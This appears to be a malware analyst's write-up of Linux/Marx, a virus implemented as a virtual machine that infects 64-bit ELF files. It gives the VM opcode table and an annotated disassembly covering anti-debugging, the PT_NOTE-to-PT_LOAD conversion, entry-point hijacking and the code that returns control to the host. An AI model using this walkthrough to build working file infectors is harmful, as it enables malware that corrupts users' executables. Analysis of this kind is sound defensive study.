Just what I needed today - a virus implemented as a virtual machine.  At least it's short.

Linux/Marx is a direct-action infector of 64-bit x86-based ELF files in the current 
directory, using the PT_LOAD technique.  Fasten your seatbelts, we're going to race 
through the code.


WHERE DO YOU WANT TO GO TODAY?

The virus is implemented using 20 general registers, one stack register, and 1504 bytes of
scratch memory (though it also moves the real stack pointer arbitrarily in order to access
more memory).  There are 31 defined commands, but only 29 of them actually do anything.

These are the commands:

0x01    NOP
0x02    PUSH reg32
0x03    POP reg64
0x04    MOV reg64_1, reg64_2
0x05    XOR reg64_1, reg64_2
0x06    SYSCALL imm8
0x07    NOP
0x08    SUB reg64_1, reg64_2
0x09    ADD reg64_1, reg64_2
0x0a    MOV reg64, RIP
0x0b    PUSH imm8
0x0c    PUSH imm16
0x0d    PUSH imm32
0x0e    JMP +/- imm16
0x0f    MOV reg8, imm8
0x10    MOV reg16, imm16
0x11    MOV reg32, imm32
0x12    CMP reg64_1, reg64_2 / JNE +/- imm16
0x13    CMP reg64_1, reg64_2 / JE +/- imm16
0x14    MOV reg8, [imm48]
0x15    MOV reg8, [reg64]
0x16    MOV reg16, [imm48]
0x17    MOV reg16, [reg64]
0x18    MOV reg32, [imm48]
0x19    MOV reg32, [reg64]
0x1a    MOV [imm48], reg8
0x1b    MOV [reg64], reg8
0x1c    MOV [imm48], reg16
0x1d    MOV [reg64], reg16
0x1e    MOV [imm48], reg32
0x1f    MOV [reg64], reg32
0x20    CMP reg64, 0 / JLE +/- imm16

We see instructions for assigning values to registers, reading and writing almost arbitrary 
(there are restrictions) memory, in different sizes, stack manipulation, basic arithmetic, 
(conditional) transfer of control, and calling system APIs... everything that a growing VM 
needs.  Interestingly, the CMP-and-branch combinations are implemented as a single 
instruction each.  The branch instruction does not have its own address.


SIZE DOES MATTER

What we don't see from the outside are all of the little details and traps.  Internally, 
each instruction is eight bytes long.  This format means that there is no way to work 
directly with 64-bit values, despite the VM registers and memory slots being 64-bit 
internally.  It is the same problem that the ARM architecture has, but it also lacks a 
global pointer to data (there is access to RIP, which could theoretically allow access 
to RIP-relative immediates, but the virus is not prepared to deal with them), and no shift
instruction, so values beyond 32 bits have to be constructed by writing to memory, either 
by (constructed) address, or using the stack.

That leads us to the biggest issue with the implementation, which is that the memory 
writes don't zero-extend.  It means that a "PUSH imm8" will leave 56 bits unchanged in 
memory.  That might be considered acceptable behaviour since the instruction will adjust 
the stack pointer by only one byte... until we try to pop the stack.  Why?  Because a 
"POP" will pull all eight bytes from the stack, leading to an unbalanced stack and sadness.

However, it also means that a "MOV REG32, []" will leave the upper 32 bits unchanged, 
requiring an explicit "XOR reg, reg" before the "MOV" in order to have a fully-defined 
register.  That leads to code bloat.  Given that the most common use of the memory reads 
and writes is paired with the XOR, the MOV set could be reduced to just reg32-style, which 
would cut eight instructions.  Given how many registers are available, the "imm48" option 
could be removed, too, cutting another two instructions.

The CMP set is interesting, too.  If the branch instructions were separated into individual
instructions, then there would be a single CMP, and all of the branches could be encoded as
a single instruction, by using a sub-byte to specify the type.  It would also allow for 
more types of branches.


MAKE MY DAY

What does the virtualised virus code look like?  Here is a disassembly.

0000 (0a):    MOV reg[11], RIP

The virus starts by saving the execution address.  It is used later when infecting a file.

0008 (0f):    MOV dil, 0x00
0010 (0f):    MOV sil, 0x00
0018 (0f):    MOV dl, 0x01
0020 (0f):    MOV r10l, 0x00

These MOV instructions are redundant here because all registers are initialised to zero by 
the VM interpreter, but it's good programming practice to initialise them explicitly.

0028 (06):    SYSCALL 101

ptrace(PTRACE_TRACEME, 0, 1, 0).
This is an anti-debugging technique.  The virus attempts to trace itself, which will fail 
if a debugger is attached already.  Silvio Cesare published in 1999 a paper on Linux 
anti-debugging techniques.  That paper included the non-zero value for the address 
parameter.  However, it is unknown why he used that value, since none of the parameters 
are ever read by the kernel in a TRACEME request.

0030 (04):    MOV reg[02], RET
0038 (0f):    MOV dil, 0x00
0040 (12):    CMP reg[02], rdi    
              JNE 0050  
0048 (0e):    JMP 0060

Save the return value from ptrace() call, compare it with zero (cannot use the "CMP ,0" 
instruction because the branch type is wrong).  If the return value is non-zero, that's 
an error, and an indication that a debugger is detected.

0050 (0f):    MOV dil, 0x7b
0058 (06):    SYSCALL 60

If a debugger was detected, then exit the process with error code 123.  The host code is
not executed.  The program just acquired debugger protection unintentionally.

0060 (0f):    MOV dil, 0x01
0068 (05):    XOR rsi, rsi
0070 (04):    MOV rsi, SP

This is an example of the "must XOR before MOV" due to the lack of zero-extension.  This 
problem could be solved by changing the implementation to MOVZX-based instructions and 
always writing all 64 bits.

0078 (0d):    PUSH "ACAB"
0080 (0f):    MOV dl, 0x04
0088 (06):    SYSCALL 1

write(stdout, "BACA", 4).
Announce the presence of the virus.  Or something.

0090 (05):    XOR rdi, rdi
0098 (04):    MOV rdi, SP
00a0 (0b):    PUSH '.'
00a8 (05):    XOR rsi, rsi
00b0 (06):    SYSCALL 2

open(".", O_RDONLY).
Open the current directory for reading.

00b8 (04):    MOV rdi, RET
00c0 (04):    MOV rsi, SP
00c8 (05):    XOR rdx, rdx
00d0 (10):    MOV dx, 0x0400
00d8 (06):    SYSCALL 217

getdents64(fd, &dirp, 1024).
Fetch directory entries into the scratch space.
This call might miss some entries if a few file filenames are very long, because it is 
called only once.

00e0 (04):    MOV reg[07], RET
00e8 (09):    ADD SP, reg[03]

Oops. Lucky that reg[03] is zero.  This looks like a left-over from code that was removed.

00f0 (05):    XOR reg[06], reg[06]

Initialise byte count within the array of entries.

00f8 (04):    MOV reg[02], SP
0100 (05):    XOR reg[03], reg[03]
0108 (0f):    MOV regb[03], 0x13
0110 (09):    ADD reg[02], reg[03]

reg[02] now points to dirp.d_name[].

0118 (04):    MOV reg[04], SP
0120 (05):    XOR reg[05], reg[05]
0128 (04):    MOV reg[05], SP
0130 (0f):    MOV regb[03], 0x12
0138 (09):    ADD reg[05], reg[03]

reg[05] now points to dirp.d_type.

0140 (15):    MOV regb[03], [reg[05]]

Fetch the file type into low byte of reg[03].  The rest of the register was zeroed earlier.

0148 (0e):    JMP 01b0

This is a "while() {}" loop, not a "do {} while()", so jump to the end of the loop to check
for the exit condition.

0150 (04):    MOV SP, reg[04]

This is the entry enumerator.  Restore the buffer pointer that might have been altered 
during infection.

0158 (05):    XOR reg[05], reg[05]
0160 (04):    MOV reg[05], SP
0168 (05):    XOR reg[03], reg[03]
0170 (0f):    MOV regb[03], 0x10
0178 (09):    ADD reg[05], reg[03]

reg[05] now points to dirp.d_reclen.

0180 (05):    XOR reg[04], reg[04]
0188 (17):    MOV regw[04], [reg[05]]
0190 (09):    ADD reg[06], reg[04]

Fetch reclen and adjust byte count accordingly.  This means that the first entry in the 
directory is always skipped.  It is also technically a bug, since d_off should be used 
instead of reclen to reach the next entry.

0198 (09):    ADD SP, reg[04]
01a0 (12):    CMP reg[06], reg[07]
              JNE 00f8

Adjust the buffer pointer correspondingly, and branch until all bytes read.  As noted 
previously, the use of reclen instead of d_off could result in mismatched offsets and 
this loop not exiting when expected.

01a8 (0e):    JMP 0750

Jump out of bounds.  The interpreter will detect this case and exit.  Beyond this point 
there could be stored 64-bit immediates that the code could read, which would avoid the 
need to construct values.

01b0 (05):    XOR reg[08], reg[08]
01b8 (0f):    MOV regb[08], 0x08
01c0 (12):    CMP reg[03], reg[08]
              JNE 0150

Branch if d_type is not DT_REG. That is, if the entry does not describe a regular file.

01c8 (04):    MOV reg[12], reg[02]
01d0 (04):    MOV rdi, reg[02]
01d8 (05):    XOR rsi, rsi
01e0 (10):    MOV si, 0x0402
01e8 (06):    SYSCALL 2

open(d_name, O_RDWR | O_NOCTTY).
It is unknown why NOCTTY is specified while opening a regular file.

01f0 (20):    CMP RET, 0
              JLE 0150

Branch if the file-open request failed.

01f8 (04):    MOV reg[02], RET

reg[02] now holds the file descriptor.

0200 (04):    MOV rdi, reg[02]
0208 (04):    MOV rsi, SP
0210 (10):    MOV regw[08], 0x1000
0218 (09):    ADD rsi, reg[08]

Point to far far away.  This is a dangerous idea since the stack pointer is crossing a 
page.  The safer alternative would have been to go downwards in memory and probe the 
memory first.

0220 (06):    SYSCALL 5

fstat(fd, &statbuf).

0228 (05):    XOR reg[08], reg[08]
0230 (0f):    MOV regb[08], 0x30
0238 (09):    ADD rsi, reg[08]
0240 (04):    MOV reg[09], rsi

reg[09] now points to fd.st_size.

0248 (05):    XOR rsi, rsi
0250 (05):    XOR rdi, rdi
0258 (19):    MOV esi, [reg[09]]
0260 (0f):    MOV regb[08], 0x06
0268 (04):    MOV rdx, reg[08]
0270 (0f):    MOV regb[08], 0x01
0278 (04):    MOV r10, reg[08]
0280 (04):    MOV r8, reg[02]
0288 (05):    XOR r9, r9
0290 (06):    SYSCALL 9

mmap(0, file size, PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0).
It is unknown why EXEC permission is requested, given that the map is only ever read 
and written.

0298 (19):    MOV edi, [regd[09]]
02a0 (04):    MOV reg[09], rdi

reg[09] now holds the file size.  This could have been achieved earlier and saved one 
instruction.

02a8 (04):    MOV reg[10], RET

reg[10] now holds the returned map pointer.  The virus assume that the request always 
succeeds.

02b0 (05):    XOR reg[05], reg[05]
02b8 (19):    MOV regd[05], [reg[10]]

reg[05] now holds the first four bytes of the file, the contents of EI_MAGIC.

02c0 (11):    MOV regd[08], 0x464c457f
02c8 (12):    CMP reg[08], reg[05]
              JNE 0348

Branch if the file is not an ELF. That is, EI_MAGIC does not match "\x7FELF".

02d0 (05):    XOR reg[08], reg[08]
02d8 (0f):    MOV regb[08], 0x04
02e0 (04):    MOV reg[05], reg[10]
02e8 (09):    ADD reg[05], reg[08]

reg[05] now points to Ehdr.e_ident[EI_CLASS].

02f0 (05):    XOR rdi, rdi
02f8 (15):    MOV dil, [reg[05]]

Fetch the class into low byte of rdi.

0300 (0f):    MOV regb[08], 0x02
0308 (12):    CMP reg[08], rdi
              JNE 0348

Branch if the file is not 64-bit.  That is, EI_CLASS is not ELFCLASS64.

0310 (05):    XOR reg[08], reg[08]
0318 (0f):    MOV regb[08], 0x09
0320 (04):    MOV reg[05], reg[10]
0328 (09):    ADD reg[05], reg[08]

reg[05] now points to Ehdr.e_ident[EI_PAD].

0330 (19):    MOV edi, [reg[05]]

rdi now holds the first four bytes of the padding.

0338 (11):    MOV regd[08], 0xdeadc0de
0340 (12):    CMP reg[08], rdi
              JNE 0368

Branch if the file is not infected already.  That is, EI_PAD does not hold "0xdeadc0de".

0348 (05):    XOR reg[08], reg[08]
0350 (04):    MOV rdi, reg[02]
0358 (06):    SYSCALL 3

close(fd).

0360 (0e):    JMP 0128

The file is infected, jump to ... where?  It's the wrong target address!  It should have
been 0150.  Bad things are about to happen.

0368 (05):    XOR reg[08], reg[08]
0370 (05):    XOR reg[05], reg[05]
0378 (0f):    MOV regb[08], 0x20
0380 (04):    MOV rdi, reg[10]
0388 (09):    ADD rdi, reg[08]

This is the happy path - the file is not infected.
rdi now points to Ehdr.e_phoff.

0390 (19):    MOV regd[05], [rdi]

reg[05] now holds the PHT offset.  Remember this.  There will be a quiz later.

0398 (0f):    MOV regb[08], 0x16
03a0 (09):    ADD rdi, reg[08]

rdi now points to Ehdr.e_phentsize.

03a8 (17):    MOV si, [rdi]

rsi now holds the PHT entry size.

03b0 (0f):    MOV regb[08], 0x02
03b8 (09):    ADD rdi, reg[08]

rdi now points to Ehdr.e_phnum.

03c0 (17):    MOV regw[08], [rdi]

reg[08] now holds the number of program header entries.

03c8 (09):    ADD reg[05], rsi

Move to the next program header entry.  Yes, the first entry is always skipped.  
The assumption here is that the entry of interest will never be first.

03d0 (05):    XOR rdi, rdi
03d8 (0f):    MOV dil, 0x01
03e0 (08):    SUB reg[08], rdi
03e8 (04):    MOV rdi, reg[10]
03f0 (09):    ADD rdi, reg[05]

rdi now points to a Elf64_Phdr.

03f8 (05):    XOR rdx, rdx
0400 (15):    MOV dl, [rdi]

rdx now holds the Elf64_Phdr.p_type.

0408 (04):    MOV rdi, rdx
0410 (05):    XOR rdx, rdx
0418 (0f):    MOV dl, 0x04
0420 (13):    CMP rdi, rdx
              JE 0438

Branch if the interesting entry type is found.  That is, p_type is PT_NOTE.

0428 (05):    XOR rdx, rdx
0430 (12):    CMP reg[08], rdx
              JNE 03c8

Otherwise, branch while entries remain to check.  THEN FALL THROUGH ANYWAY.
Any file that has no note entry will be have its last program header altered unexpectedly,
and an infection marker added.

0438 (04):    MOV rdi, reg[10]
0440 (05):    XOR rdx, rdx
0448 (0f):    MOV dl, 0x09
0450 (09):    ADD rdi, rdx

rdi now points to Ehdr.e_ident[EI_PAD].

0458 (11):    MOV edx, 0xdeadc0de
0460 (1f):    MOV [rdi], edx

Mark the file as infected.  The virus code expects to succeed in all subsequent operations
on the file.  If nothing else, this marker serves as an inoculation against infection by 
the same virus.  Of course, since this space is used very commonly by other viruses to 
store their infection marker, it's possible to end up with "sandwiches" of alternating 
virus infections.

0468 (04):    MOV rdi, reg[10]
0470 (09):    ADD rdi, reg[05]

rdi now points to the note entry.  Keeping track of all of these registers is one of the 
challenges when working through VM code, especially when registers are reused heavily.

0478 (05):    XOR rdx, rdx
0480 (0f):    MOV dl, 0x01
0488 (1f):    MOV [rdi], edx

Convert program header type from PT_NOTE to PT_LOAD, a loadable segment.

0490 (04):    MOV rdi, reg[10]
0498 (09):    ADD rdi, reg[05]

rdi now points to the new loadable segment.  Or, really, to exactly where it was already. 
We're not in a constrained environment.  Performance is not a concern.  
Go ahead, I won't judge.

04a0 (0f):    MOV dl, 0x04
04a8 (09):    ADD rdi, rdx

rdi now points to Elf64_Phdr.p_flags.

04b0 (05):    XOR rdx, rdx
04b8 (0f):    MOV dl, 0x07
04c0 (1f):    MOV [rdi], edx

Mark segment executable, readable, and writable.  The executable and readable are obvious 
requirements.  It is unknown why the writable flag is used.

04c8 (04):    MOV rdi, reg[10]
04d0 (09):    ADD rdi, reg[05]

rdi now points to the new loadable segment.  Could have just subtracted instead.

04d8 (0f):    MOV dl, 0x20
04e0 (09):    ADD rdi, rdx

rdi now points to Elf64_Phdr.p_filesz.

04e8 (19):    MOV r10d, [rdi]
04f0 (10):    MOV dx, 0x0e8e
04f8 (09):    ADD r10, rdx
0500 (1f):    MOV [rdi], r10d

Increase the size of the segment in the file.

0508 (04):    MOV rdi, reg[10]
0510 (09):    ADD rdi, reg[05]

rdi now points to the new loadable segment.  Could have put this value in another register.
There are so many.

0518 (05):    XOR rdx, rdx
0520 (0f):    MOV dl, 0x28
0528 (09):    ADD rdi, rdx

rdi now points to Elf64_Phdr.p_memsz.

0530 (19):    MOV r10d, [rdi]
0538 (10):    MOV dx, 0x0e8e
0540 (09):    ADD r10, rdx
0548 (1f):    MOV [rdi], r10d

Increase the length of the segment in memory.  There is no check if the increase in size 
will be overlapped by a later segment.

0550 (05):    XOR rdx, rdx
0558 (0f):    MOV dl, 0x20
0560 (08):    SUB rdi, rdx

rdi now points to Elf64_Phdr.p_offset.  Hey, subtract!  Just in time.  It's the last one.

0568 (1f):    MOV [rdi], regd[09]

Change the program header's offset to the original end-of-file.

0570 (05):    XOR r10, r10
0578 (11):    MOV r10d, 0x0c000000
0580 (09):    ADD r10, reg[09]

Construct 0x0c000000 + original file size, as the location in memory for the segment to 
load.

0588 (04):    MOV rdi, reg[10]
0590 (0f):    MOV dl, 0x18
0598 (09):    ADD rdi, rdx

rdi now points to Elf64_Ehdr.e_entry.

05a0 (19):    MOV r8d, [rdi]

r8 now holds the original entry-point address.

05a8 (1f):    MOV [rdi], r10d

Set new entry-point to 0x0c000000 + original file size.

05b0 (05):    XOR rdx, rdx
05b8 (0f):    MOV dl, 0x08
05c0 (08):    SUB rdi, rdx
05c8 (09):    ADD rdi, reg[05]

rdi now points to Elf64_Phdr.p_vaddr.

05d0 (1f):    MOV [rdi], r10d

Set the program header entry virtual address to 0x0c000000 + original file size.

05d8 (05):    XOR r9, r9
05e0 (10):    MOV r9w, 0x1040
05e8 (09):    ADD SP, r9

Point to even more far far away.  Another page-crossing, extra dangerous.

05f0 (04):    MOV r9, SP
05f8 (0d):    PUSH 0xffffe8e8 call get_RIP
0600 (0d):    PUSH 0x932d48ff sub rax
0608 (0b):    PUSH 0x01       , 0x193
0610 (0d):    PUSH 0x2d480000 sub rax
0618 (02):    PUSH r10        , 0x0c000000 + original file size
0620 (0c):    PUSH 0x0548     add rax
0628 (02):    PUSH r8         original entry-point
0630 (0d):    PUSH 0xfff4894c mov rsp, r14
0638 (0b):    PUSH 0xe0       jmp rax

Construct this code in memory:

call get_RIP
sub  rax, 0x193
sub  rax, 0x0c000000 + original file size
add  rax, original entry-point
mov  rsp, r14
jmp  rax

This is how the virus transfers control to the host original entry-point (OEP) on 
completion.

It's easier to perform the individual operations on the real CPU than to try to do 
the arithmetic in the VM.

0640 (04):    MOV rdi, reg[10]
0648 (04):    MOV rsi, reg[09]
0650 (05):    XOR rdx, rdx
0658 (0f):    MOV dl, 0x04
0660 (06):    SYSCALL 26

msync(mmap, file size, MS_SYNC).
Flush the altered mapped memory back to the disk.  Now we have a file that is marked 
infected, with an altered entry-point, but no virus content.  We also have a 
race-condition with a potential request to run the file before the infection completes.

There's an interesting side-effect to the sync operation - the file offset is at the 
end of the file, so no need to seek there.

0668 (06):    SYSCALL 11

munmap(mmap, file size).

0670 (04):    MOV rdi, reg[02]
0678 (10):    MOV dx, 0x03bc
0680 (04):    MOV rsi, reg[11]

Here's the one time that we use RIP.

0688 (08):    SUB rsi, rdx
0690 (05):    XOR rdx, rdx
0698 (10):    MOV dx, 0x0e8e
06a0 (06):    SYSCALL 1

write(fd, start of virus code, size).

06a8 (06):    SYSCALL 3

close(fd).
Now we have a file that is marked infected, with an altered entry-point, and actual virus
content, but no code to return control to the host.  The race continues.

06b0 (04):    MOV rdi, reg[12]

rdi now points to dirp.d_name[].

06b8 (05):    XOR rsi, rsi
06c0 (0f):    MOV sil, 0x02
06c8 (06):    SYSCALL 2

open(d_name, O_RDWR).
This could have been WRONLY, given what's about to happen.

06d0 (04):    MOV rdi, RET
06d8 (05):    XOR rsi, rsi
06e0 (10):    MOV si, 0x018e
06e8 (09):    ADD rsi, reg[09]
06f0 (05):    XOR rdx, rdx
06f8 (06):    SYSCALL 8

lseek(fd, location of OEP transfer code, SEEK_SET).

0700 (05):    XOR rdx, rdx
0708 (0f):    MOV dl, 0x1c
0710 (04):    MOV rsi, r9
0718 (06):    SYSCALL 1

write(fd, OEP transfer code, size of OEP transfer code).

0720 (06):    SYSCALL 3

close(fd).
Hey, we have a fully-infected file!

0728 (05):    XOR r9, r9
0730 (10):    MOV r9w, 0x1040
0738 (08):    SUB SP, r9

That was unexpected.  0x1040 was the size of the addition, but it misses the OEP transfer
code that was pushed onto the stack.  It also misses the additional 0x1000 bytes that were
added when the file was opened.  If this value were used then there would be a progressive
stack-leak.  Hilarity ensures.

0740 (0e):    JMP 0150

Move to the next entry in the directory list.  The code at 0150 also restores the stack 
pointer correctly.

0748 (01):    NOP

Unused as an instruction, used as bounds checking by the interpreter.


CONCLUSION

Writing even a simple virus is far from simple.  Writing a VM is also far from simple.  
Combining the two is a recipe for disaster.
